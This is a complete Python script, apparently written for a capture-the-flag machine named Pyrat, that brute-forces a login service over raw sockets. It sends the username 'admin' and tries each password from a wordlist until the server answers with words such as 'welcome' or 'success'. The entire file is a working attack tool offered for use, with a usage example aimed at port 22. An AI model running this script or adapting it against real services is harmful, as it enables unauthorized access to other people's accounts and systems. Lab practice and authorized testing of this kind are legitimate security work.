#!/usr/bin/env python3
"""
PYRAT BRUTEFORCE TOOL 
This tool is used to bruteforce passwords, while supplying userame after timeout
"""

import socket
import time
import sys

def connect_and_test(ip, port, wordlist_file):
    """
    Connect to a server and test authentication with wordlist
    
    Args:
        ip (str): Target IP address
        port (int): Target port number
        wordlist_file (str): Path to password wordlist file
    """
    
    # Read passwords from wordlist file
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist_file}' not found")
        return
    except Exception as e:
        print(f"Error reading wordlist: {e}")
        return
    
    print(f"Loaded {len(passwords)} passwords from wordlist")
    print(f"Testing authentication on {ip}:{port}")
    print("-" * 50)
    
    password_count = 0
    
    for password in passwords:
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # 10 second timeout
            
            print(f"Attempting connection to {ip}:{port}")
            sock.connect((ip, port))
            
            # Receive initial response from server
            try:
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                print(f"Server response: {response.strip()}")
            except:
                pass
            
            # Send username
            username = "admin\n"
            print(f"Sending username: {username.strip()}")
            sock.send(username.encode())
            
            # Small delay
            time.sleep(1)
            
            # Receive username response
            try:
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                print(f"Username response: {response.strip()}")
            except:
                pass
            
            # Send password
            password_line = password + "\n"
            print(f"Trying password: {password}")
            sock.send(password_line.encode())
            
            # Receive password response
            time.sleep(1)
            try:
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                print(f"Password response: {response.strip()}")
                
                # Check for successful authentication indicators
                success_indicators = ['welcome', 'success', 'logged in', 'authenticated']
                if any(indicator in response.lower() for indicator in success_indicators):
                    print(f"\n*** POTENTIAL SUCCESS! Password: {password} ***")
                    print(f"Server response: {response}")
                    sock.close()
                    return
                    
            except:
                pass
            
            sock.close()
            password_count += 1
            
            # After every 3 password attempts, send username again
            if password_count % 3 == 0:
                print(f"\nCompleted {password_count} attempts. Resending username on next connection...")
                time.sleep(2)  # Brief pause between attempts
            else:
                time.sleep(1)  # Small delay between attempts
                
        except socket.timeout:
            print(f"Connection timeout for password: {password}")
        except ConnectionRefusedError:
            print(f"Connection refused to {ip}:{port}")
            break
        except Exception as e:
            print(f"Error with password '{password}': {e}")
        
        # Add a small delay to avoid overwhelming the target
        time.sleep(0.5)
    
    print(f"\nCompleted testing {len(passwords)} passwords")
    print("No successful authentication found")

def main():
    """Main function to handle command line arguments and start testing"""
    
    if len(sys.argv) != 4:
        print("Usage: pyrat_brute.py <IP> <PORT> <WORDLIST_FILE>")
        print("Example: pyrat_brute.py 192.168.1.100 22 passwords.txt")
        sys.exit(1)
    
    ip = sys.argv[1]
    try:
        port = int(sys.argv[2])
    except ValueError:
        print("Error: Port must be a number")
        sys.exit(1)
    
    wordlist_file = sys.argv[3]
    
    print("PYRAT bruteforce tool")
    print("============================")
    print(f"Target: {ip}:{port}")
    print(f"Wordlist: {wordlist_file}")
    print(f"Username: admin")
    print("\nStarting authentication test...")
    print("Press Ctrl+C to stop")
    
    try:
        connect_and_test(ip, port, wordlist_file)
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
    except Exception as e:
        print(f"\nUnexpected error: {e}")

if __name__ == "__main__":
    main()
